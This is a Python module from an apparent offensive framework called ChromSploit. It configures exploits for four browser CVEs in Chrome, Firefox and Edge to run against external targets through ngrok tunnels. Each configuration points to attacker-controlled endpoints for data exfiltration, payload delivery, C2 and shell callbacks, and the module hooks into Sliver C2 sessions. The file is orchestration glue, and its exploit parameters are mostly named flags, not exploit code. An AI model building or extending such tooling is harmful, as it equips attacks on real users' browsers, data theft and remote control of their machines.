#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
CVE Exploit Integrations with Ngrok Auto-Configuration

This module provides integration between CVE exploits and ngrok tunnels
for external target exploitation.
"""

from typing import Dict, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse

from core.enhanced_logger import get_logger
from core.ngrok_manager import get_ngrok_manager, register_cve_integration

@dataclass
class CVEExploitConfig:
    """Configuration for CVE exploits with tunnel integration"""
    cve_id: str
    target_url: Optional[str] = None
    local_port: int = 8080
    tunnel_url: Optional[str] = None
    exploit_parameters: Dict[str, Any] = field(default_factory=dict)
    external_mode: bool = False
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update configuration from tunnel data"""
        if tunnel_data.get('public_url'):
            self.tunnel_url = tunnel_data['public_url']
            self.target_url = tunnel_data['public_url']
            self.local_port = tunnel_data.get('port', self.local_port)
            self.external_mode = True
            
            # Update exploit-specific parameters
            parsed_url = urlparse(self.tunnel_url)
            self.exploit_parameters.update({
                'callback_host': parsed_url.hostname,
                'callback_port': parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                'callback_url': self.tunnel_url,
                'external_url': self.tunnel_url
            })

class CVE2025_4664_Config(CVEExploitConfig):
    """Configuration for CVE-2025-4664 (Chrome Data Leak)"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-4664")
        self.exploit_parameters = {
            'link_header_size': 8192,
            'memory_leak_size': 1024,
            'chunk_size': 256,
            'leak_attempts': 5
        }
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-4664 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        # CVE-specific parameters
        if self.tunnel_url:
            self.exploit_parameters.update({
                'malicious_server': self.tunnel_url,
                'link_header_url': f"{self.tunnel_url}/leak-endpoint",
                'data_exfil_url': f"{self.tunnel_url}/collect-data"
            })

class CVE2025_2783_Config(CVEExploitConfig):
    """Configuration for CVE-2025-2783 (Chrome Mojo Sandbox Escape)"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-2783")
        self.exploit_parameters = {
            'mojo_interface': 'NodeController',
            'handle_count': 1024,
            'validation_bypass': True,
            'sandbox_escape': True
        }
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-2783 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'c2_server': self.tunnel_url,
                'payload_url': f"{self.tunnel_url}/mojo-payload",
                'shell_callback': f"{self.tunnel_url}/shell"
            })

class CVE2025_2857_Config(CVEExploitConfig):
    """Configuration for CVE-2025-2857 (Firefox Sandbox Escape)"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-2857")
        self.exploit_parameters = {
            'ipdl_interface': 'PContent',
            'handle_confusion': True,
            'privilege_escalation': True
        }
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-2857 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'exploit_server': self.tunnel_url,
                'ipdl_payload_url': f"{self.tunnel_url}/firefox-payload",
                'escalation_callback': f"{self.tunnel_url}/escalate"
            })

class CVE2025_30397_Config(CVEExploitConfig):
    """Configuration for CVE-2025-30397 (Edge WebAssembly JIT Escape)"""
    
    def __init__(self):
        super().__init__(cve_id="CVE-2025-30397")
        self.exploit_parameters = {
            'wasm_module_size': 4096,
            'jit_spray_count': 1000,
            'heap_corruption': True,
            'code_execution': True
        }
    
    def update_from_tunnel(self, tunnel_data: Dict[str, Any]):
        """Update CVE-2025-30397 specific configuration"""
        super().update_from_tunnel(tunnel_data)
        
        if self.tunnel_url:
            self.exploit_parameters.update({
                'wasm_server': self.tunnel_url,
                'malicious_wasm_url': f"{self.tunnel_url}/malicious.wasm",
                'jit_payload_url': f"{self.tunnel_url}/jit-payload"
            })

class CVEIntegrationManager:
    """Manages CVE exploit integrations with ngrok"""
    
    def __init__(self):
        self.logger = get_logger()
        self.ngrok_manager = get_ngrok_manager()
        
        # Initialize CVE configurations
        self.cve_configs = {
            'CVE-2025-4664': CVE2025_4664_Config(),
            'CVE-2025-2783': CVE2025_2783_Config(),
            'CVE-2025-2857': CVE2025_2857_Config(),
            'CVE-2025-30397': CVE2025_30397_Config()
        }
        
        # Register update handlers
        self._register_handlers()
        
        self.logger.info("CVE integration manager initialized")
    
    def _register_handlers(self):
        """Register CVE update handlers with ngrok manager"""
        for cve_id, config in self.cve_configs.items():
            register_cve_integration(cve_id, self._create_update_handler(cve_id))
            self.logger.debug(f"Registered handler for {cve_id}")
    
    def _create_update_handler(self, cve_id: str):
        """Create update handler for specific CVE"""
        def update_handler(tunnel_data: Dict[str, Any]):
            if cve_id in self.cve_configs:
                config = self.cve_configs[cve_id]
                config.update_from_tunnel(tunnel_data)
                self.logger.info(f"Updated {cve_id} configuration with tunnel: {tunnel_data.get('public_url')}")
        
        return update_handler
    
    def get_cve_config(self, cve_id: str) -> Optional[CVEExploitConfig]:
        """Get configuration for specific CVE"""
        return self.cve_configs.get(cve_id)
    
    def get_all_configs(self) -> Dict[str, CVEExploitConfig]:
        """Get all CVE configurations"""
        return self.cve_configs.copy()
    
    def is_external_mode_active(self) -> bool:
        """Check if any CVE is configured for external mode"""
        return any(config.external_mode for config in self.cve_configs.values())
    
    def get_active_external_cves(self) -> Dict[str, CVEExploitConfig]:
        """Get CVEs configured for external exploitation"""
        return {
            cve_id: config for cve_id, config in self.cve_configs.items()
            if config.external_mode
        }
    
    def export_configuration_status(self) -> Dict[str, Any]:
        """Export current configuration status"""
        return {
            'timestamp': self.logger.logger.handlers[0].format(self.logger.logger.makeRecord(
                'integration', 20, '', 0, 'Export', (), None
            )) if self.logger.logger.handlers else '',
            'external_mode_active': self.is_external_mode_active(),
            'ngrok_manager_status': {
                'external_target_mode': self.ngrok_manager.external_target_mode,
                'auto_sync_enabled': self.ngrok_manager.auto_sync_enabled,
                'active_tunnels': len(self.ngrok_manager.get_active_tunnels())
            },
            'cve_configurations': {
                cve_id: {
                    'external_mode': config.external_mode,
                    'tunnel_url': config.tunnel_url,
                    'target_url': config.target_url,
                    'local_port': config.local_port,
                    'parameter_count': len(config.exploit_parameters)
                }
                for cve_id, config in self.cve_configs.items()
            }
        }

# Global instance
_cve_integration_manager = None

def get_cve_integration_manager() -> CVEIntegrationManager:
    """Get or create CVE integration manager instance"""
    global _cve_integration_manager
    if _cve_integration_manager is None:
        _cve_integration_manager = CVEIntegrationManager()
    return _cve_integration_manager

# Convenience functions for exploit modules
def get_cve_config(cve_id: str) -> Optional[CVEExploitConfig]:
    """Get configuration for specific CVE exploit"""
    manager = get_cve_integration_manager()
    return manager.get_cve_config(cve_id)

def is_external_target_mode() -> bool:
    """Check if external target mode is active"""
    manager = get_cve_integration_manager()
    return manager.is_external_mode_active()

def get_exploit_parameters(cve_id: str) -> Dict[str, Any]:
    """Get exploit parameters for specific CVE"""
    config = get_cve_config(cve_id)
    if config:
        return config.exploit_parameters
    return {}

def get_target_url(cve_id: str) -> Optional[str]:
    """Get target URL for specific CVE"""
    config = get_cve_config(cve_id)
    if config:
        return config.target_url
    return None

# Import Sliver C2 integration if available
try:
    from .cve_integrations_sliver import (
        get_cve_sliver_manager, 
        execute_cve_with_sliver,
        get_sliver_sessions,
        interact_with_sliver_session
    )
    SLIVER_AVAILABLE = True
except ImportError:
    SLIVER_AVAILABLE = False
    get_logger().warning("Sliver C2 integration not available")

# Example usage in exploit modules
def example_cve_exploit_with_tunnel_integration():
    """Example showing how to use tunnel integration in exploits"""
    
    # Get CVE configuration
    config = get_cve_config('CVE-2025-4664')
    
    if config and config.external_mode:
        print(f"External mode active for CVE-2025-4664")
        print(f"Target URL: {config.target_url}")
        print(f"Tunnel URL: {config.tunnel_url}")
        print(f"Exploit parameters: {config.exploit_parameters}")
        
        # Use tunnel URL for exploitation
        malicious_server = config.exploit_parameters.get('malicious_server')
        if malicious_server:
            print(f"Using malicious server: {malicious_server}")
            # Perform exploitation with external tunnel
            
            # If Sliver C2 is available, use it
            if SLIVER_AVAILABLE:
                success, msg = execute_cve_with_sliver('CVE-2025-4664', config.target_url)
                print(f"Sliver C2 integration: {msg}")
    else:
        print("External mode not active, using local exploitation")
        # Perform local exploitation

if __name__ == "__main__":
    # Initialize CVE integration
    manager = get_cve_integration_manager()
    
    # Show current status
    status = manager.export_configuration_status()
    print("CVE Integration Status:")
    print(f"  External mode active: {status['external_mode_active']}")
    print(f"  Active tunnels: {status['ngrok_manager_status']['active_tunnels']}")
    
    for cve_id, config in status['cve_configurations'].items():
        print(f"  {cve_id}: {'External' if config['external_mode'] else 'Local'}")
        if config['tunnel_url']:
            print(f"    Tunnel: {config['tunnel_url']}")